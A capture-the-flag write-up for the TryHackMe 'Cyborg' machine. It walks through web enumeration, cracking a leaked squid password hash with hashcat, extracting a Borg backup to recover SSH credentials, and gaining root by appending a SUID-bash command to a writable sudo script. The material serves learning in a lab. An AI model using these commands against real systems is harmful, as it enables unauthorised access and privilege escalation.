---
title: Cyborg
description: Writeup for the TryHackMe machine Cyborg
date: 2021-01-24
categories: [TryHackMe]
tags: [try-hack-me,thm]
---

## Recon

### nmap

`nmap` finds two open ports: SHH (22) and HTTP (80).
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

### HTTP - TCP 80

The root page displays the default Apache welcome page.
I use `gobuster` to enumerate directories:
```console
$ gobuster dir -u "http://cyborg.thm/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 404 -t 200 --timeout 40s -k
/admin                (Status: 301) [Size: 314] [--> /admin/]
/etc                  (Status: 301) [Size: 312] [--> /etc/]
```
The `/admin/` directory hosts a static website. The navigation bar links to a page labeled Admins containing a conversation snippet, which mentions a squid proxy and a backup called `music_archive`:
```
Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
I decided to give up like i always do ahahaha sorry about that.
I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
Might pass it over to the IT guys but in the meantime all the config files are laying about.
And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
other than that im pretty sure my backup "music_archive" is safe just to confirm.
```
Additionally, the site provides a link to download an archive.

The `/etc/` directory allows directory listing and contains a `squid` subdirectory with two files:
- `/etc/squid/passwd`: contains a hashed password `music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`
- `/etc/squid/squid.conf`: Squid configuration file:
```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

## Shell as alex

I crack the hash using `hashcat`:
```console
$ hashcat -a 0 hash.txt /usr/share/wordlists/rockyou.txt --user
[...]
1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR) | FTP, HTTP, SMTP, LDAP Server
[...]
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:<REDACTED>           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Thu Apr  3 14:52:01 2025 (1 sec)
Time.Estimated...: Thu Apr  3 14:52:02 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    57022 H/s (8.64ms) @ Accel:256 Loops:250 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 40960/14344385 (0.29%)
Rejected.........: 0/40960 (0.00%)
Restore.Point....: 38912/14344385 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidate.Engine.: Device Generator
Candidates.#1....: treetree -> loserface1
```

I download and extract the archive. Inside, the file `home/field/dev/final_archive/README` identifies the archive as a Borg Backup repository:
```
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```
I extract the `music_archive` using the cracked password:
```console
$ borgbackup extract home/field/dev/final_archive::music_archive
```
The extracted data contains the `alex` user’s home directory. Inside `home/alex/Documents/note.txt` I find:
```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:<REDACTED>
```
Using these credentials, I connect via SSH as `alex`.

## Shell as root

I check `sudo` privileges:
```console
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```
The `backup.sh` script is owned by `alex`:
```console
alex@ubuntu:~$ ls -la /etc/mp3backups/backup.sh
-r-xr-xr-- 1 alex alex 1083 Dec 30  2020 /etc/mp3backups/backup.sh
```
Since I have write access, I append a line to the script to create a SUID `bash` binary:
```console
alex@ubuntu:~$ ls -la /etc/mp3backups/backup.sh 
-r-xr-xr-- 1 alex alex 1083 Dec 30  2020 /etc/mp3backups/backup.sh
alex@ubuntu:~$ chmod +w /etc/mp3backups/backup.sh
alex@ubuntu:~$ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" >> /etc/mp3backups/backup.sh
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh
alex@ubuntu:~$ /tmp/bash -p
```
